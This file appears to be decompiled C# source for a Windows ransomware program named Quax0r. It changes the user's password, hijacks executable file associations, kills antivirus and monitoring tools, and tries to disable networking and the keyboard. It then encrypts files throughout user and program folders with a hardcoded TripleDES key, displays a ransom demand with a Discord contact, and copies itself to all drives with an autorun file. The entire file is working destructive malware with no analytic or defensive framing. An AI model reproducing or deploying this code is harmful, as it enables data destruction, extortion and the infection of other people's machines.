using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Quax0r;

public class MainForm : Form
{
	private IContainer components;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_Name("MainForm");
		((Form)this).set_Text("Quax0r");
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public MainForm()
	{
		try
		{
			InitializeComponent();
			if ((object)Environment.UserName == "sd")
			{
				Application.Exit();
				Environment.Exit(0);
				Process.GetCurrentProcess().Kill();
				((Form)this).Close();
			}
			Interaction.Shell("cmd.exe /c net users %username% LOCKEDBYROZBEHOFSATAN", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd.exe /c assoc .exe=RozbehOfSatanFile && assoc .bat=RozbehOfSatanFile && assoc .cmd=RozbehOfSatanFile", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd.exe /c echo ^[autorun^] > ..\\\\autorun.inf", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd.exe /c echo open^=WindowsScan^.exe >> ..\\\\autorun.inf", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd.exe /c netsh Interface Set Interface Wi-Fi 12 disable", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd.exe /c taskkill /im chrome.exe /f && taskkill /im WireShark.exe /f && taskkill /im MSASCUI.exe /f && taskkill /im taskmgr.exe /f && taskkill /im regedit.exe /f && taskkill /im Kaspersky.exe /f && taskkill /im msseces.exe /f && taskkill /im nod32.exe /f && taskkill /im msmpeng.exe /f && taskkill /im navapsvc.exe /f && taskkill /im avkwctl.exe /f && taskkill /im fsav32.exe /f && rundll32 keyboard,disable", (AppWinStyle)0, false, -1);
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.History));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Programs));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.SendTo));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
			EncryptDir(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
			Interaction.Shell("cmd.exe /c assoc .txt=txtfile", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd.exe /c color CF && @echo off && cls && echo All files have been encrypted by NominatusCrypto ( Quax0r ) contact the creator of this virus on discord Nominatus#9251 for more information if you restart then your account will be useless! files cannot be decrypted without paying the ransom to the creator!! live or die? make your choice now! && pause > nul", (AppWinStyle)3, false, -1);
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					FileSystem.FileCopy(Application.get_ExecutablePath(), driveInfo.ToString() + "\\\\WindowsScan.exe");
					FileSystem.FileCopy("..\\\\autorun.inf", driveInfo.ToString());
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void Cryptit(object FLName)
	{
		try
		{
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.KeySize = 192;
			tripleDESCryptoServiceProvider.Key = Encoding.UTF8.GetBytes("XORL652RZBH7890DXPQJKVFI");
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
			object obj = File.ReadAllBytes(Conversions.ToString(FLName));
			object obj2 = cryptoTransform.TransformFinalBlock((byte[])obj, 0, Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)));
			File.WriteAllBytes(Conversions.ToString(FLName), (byte[])obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void EncryptDir(object DName)
	{
		try
		{
			object files = Directory.GetFiles(Conversions.ToString(Operators.AddObject(DName, (object)"\\\\")), "*.*", SearchOption.AllDirectories);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)files).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					try
					{
						Cryptit(RuntimeHelpers.GetObjectValue(objectValue));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
